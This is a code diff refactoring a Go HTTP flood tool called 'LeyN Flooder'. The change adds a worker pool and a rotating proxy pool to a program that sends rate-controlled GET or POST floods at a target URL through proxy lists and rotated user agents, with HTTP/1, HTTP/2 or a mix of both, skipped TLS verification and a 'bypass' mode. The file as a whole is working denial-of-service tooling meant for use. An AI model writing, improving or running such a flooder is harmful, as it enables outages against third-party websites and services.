@@ -36,39 +36,42 @@ type RequestInfo struct {
 	Cookie string
 }
 
+type RequestTask struct {
+	Target string
+	Method string
+	Info   RequestInfo
+	Ver    string
+}
+
 func main() {
 	initLogger()
 
-	// 更新后的命令行参数格式：./flooder method URL时间 速率(每线程) 线程数 http_version (1/2/mix) mode
 	if len(os.Args) != 8 {
 		fmt.Println("Usage: ./program mode(GET/POST) URL duration(seconds) rate(req/sec) threads version(1/2/mix) method(flood/bypass)")
 		return
 	}
 
-	method := os.Args[1]                    // 请求方式 GET/POST
-	target := os.Args[2]                    // 目标 URL
-	duration, _ := strconv.Atoi(os.Args[3]) // 持续时间
-	rate, _ := strconv.Atoi(os.Args[4])     // 每线程请求速率
-	threads, _ := strconv.Atoi(os.Args[5])  // 线程数
-	httpVer := os.Args[6]                   // HTTP版本 1/2/mix
-	mode := os.Args[7]                      // 模式，支持不同的模式（如 flood 或其他）
+	method := os.Args[1]
+	target := os.Args[2]
+	duration, _ := strconv.Atoi(os.Args[3])
+	rate, _ := strconv.Atoi(os.Args[4])
+	threads, _ := strconv.Atoi(os.Args[5])
+	httpVer := os.Args[6]
+	mode := os.Args[7]
 
 	fmt.Printf("%s[INFO] - LeyN Flooderv1.0%s\n", green, reset)
 
 	title := getTitle(target)
 	load := getLoad(mode)
-
-	boxContent := []string{
+	printBox([]string{
 		fmt.Sprintf("Title : %s", title),
 		fmt.Sprintf("Load  : %d", load),
 		fmt.Sprintf("Method: %s / %s", mode, method),
-	}
-	printBox(boxContent)
+	})
 
 	fmt.Printf("\n%s[INFO] Flooder Running%s\n", green, reset)
 
 	var requests []RequestInfo
-	// 读取代理和用户代理信息
 	if mode == "flood" {
 		proxies := readLines("proxy.txt")
 		uas := readLines("ua.txt")
@@ -88,88 +91,83 @@ func main() {
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
 
-	var wg sync.WaitGroup
-	for i := 0; i < threads; i++ {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			tick := time.NewTicker(time.Second / time.Duration(rate))
-			defer tick.Stop()
+	requestCh := make(chan RequestTask, threads*rate)
+	proxyPool := buildProxyPool(requests)
 
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				case <-tick.C:
-					reqInfo := requests[rand.Intn(len(requests))]
-					// 如果是 mix 模式，随机选择 HTTP/1 或 HTTP/2
-					if httpVer == "mix" {
-						if rand.Intn(2) == 0 {
-							go sendRequest(target, method, reqInfo, "1") // 使用 HTTP/1
-						} else {
-							go sendRequest(target, method, reqInfo, "2") // 使用 HTTP/2
-						}
-					} else {
-						go sendRequest(target, method, reqInfo, httpVer) // 使用指定的 HTTP 版本
-					}
-				}
-			}
-		}()
-	}
+	var wg sync.WaitGroup
+	startWorkerPool(ctx, threads, requestCh, &wg)
+
+	ticker := time.NewTicker(time.Second / time.Duration(rate))
+	defer ticker.Stop()
 
 	go func() {
 		for {
 			select {
 			case <-ctx.Done():
+				close(requestCh)
 				return
-			default:
-				mu.Lock()
-
-				// 收集并排序状态码
-				var codes []int
-				for code := range statusCode {
-					codes = append(codes, code)
+			case <-ticker.C:
+				reqInfo := <-proxyPool
+				version := httpVer
+				if version == "mix" {
+					if rand.Intn(2) == 0 {
+						version = "1"
+					} else {
+						version = "2"
+					}
 				}
-				sort.Ints(codes)
-
-				// 打印排序后的状态码和数量
-				fmt.Printf("\r%s[Status] - {", yellow)
-				for _, code := range codes {
-					fmt.Printf("%d - %d ", code, statusCode[code])
-				}
-				fmt.Printf("}%s", reset)
-
-				mu.Unlock()
-				time.Sleep(1 * time.Second)
+				requestCh <- RequestTask{Target: target, Method: method, Info: reqInfo, Ver: version}
 			}
 		}
 	}()
 
+	go printStatus(ctx)
 	wg.Wait()
 }
 
-func sendRequest(targetURL, method string, info RequestInfo, httpVer string) {
-	// 创建代理 URL
-	proxyURL := http.ProxyURL(&url.URL{
-		Scheme: "http", // 如果你有 SOCKS5 代理，可以设置为 "socks5"
-		Host:   info.Proxy,
-	})
+func startWorkerPool(ctx context.Context, threads int, requestCh chan RequestTask, wg *sync.WaitGroup) {
+	for i := 0; i < threads; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				case task, ok := <-requestCh:
+					if !ok {
+						return
+					}
+					sendRequest(task.Target, task.Method, task.Info, task.Ver)
+				}
+			}
+		}()
+	}
+}
 
-	// 使用代理
+func buildProxyPool(infos []RequestInfo) chan RequestInfo {
+	pool := make(chan RequestInfo, len(infos))
+	go func() {
+		for {
+			for _, info := range infos {
+				pool <- info
+			}
+		}
+	}()
+	return pool
+}
+
+func sendRequest(targetURL, method string, info RequestInfo, httpVer string) {
+	proxyURL := http.ProxyURL(&url.URL{Scheme: "http", Host: info.Proxy})
 	tr := &http.Transport{
 		Proxy:           proxyURL,
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
-	client := &http.Client{
-		Timeout:   5 * time.Second,
-		Transport: tr,
-	}
-
 	if httpVer == "2" {
 		http2.ConfigureTransport(tr)
 	}
+	client := &http.Client{Timeout: 5 * time.Second, Transport: tr}
 
-	// 创建请求
 	req, err := http.NewRequest(method, targetURL, nil)
 	if err != nil {
 		return
@@ -179,14 +177,12 @@ func sendRequest(targetURL, method string, info RequestInfo, httpVer string) {
 		req.Header.Set("Cookie", info.Cookie)
 	}
 
-	// 执行请求
 	resp, err := client.Do(req)
 	if err != nil {
 		return
 	}
 	defer resp.Body.Close()
 
-	// 记录成功的请求
 	mu.Lock()
 	successCount++
 	statusCode[resp.StatusCode]++
@@ -243,30 +239,45 @@ func initLogger() {
 		fmt.Println("Failed to open log file:", err)
 		os.Exit(1)
 	}
-
 	consoleWriter := zerolog.ConsoleWriter{Out: os.Stdout, TimeFormat: "15:04:05"}
 	multi := io.MultiWriter(consoleWriter, logFile)
 	log.Logger = zerolog.New(multi).With().Timestamp().Logger()
 }
 
 func printBox(lines []string) {
-	// 计算最长行宽
 	maxLen := 0
 	for _, line := range lines {
 		if len(line) > maxLen {
 			maxLen = len(line)
 		}
 	}
-
-	// 打印顶部边框
 	fmt.Printf("┌%s┐\n", strings.Repeat("─", maxLen+2))
-
-	// 打印内容行
 	for _, line := range lines {
 		padding := maxLen - len(line)
 		fmt.Printf("│ %s%s │\n", line, strings.Repeat(" ", padding))
 	}
-
-	// 打印底部边框
 	fmt.Printf("└%s┘\n", strings.Repeat("─", maxLen+2))
+}
+
+func printStatus(ctx context.Context) {
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+			mu.Lock()
+			var codes []int
+			for code := range statusCode {
+				codes = append(codes, code)
+			}
+			sort.Ints(codes)
+			fmt.Printf("\r%s[Status] - {", yellow)
+			for _, code := range codes {
+				fmt.Printf("%d - %d ", code, statusCode[code])
+			}
+			fmt.Printf("}%s", reset)
+			mu.Unlock()
+			time.Sleep(1 * time.Second)
+		}
+	}
 }
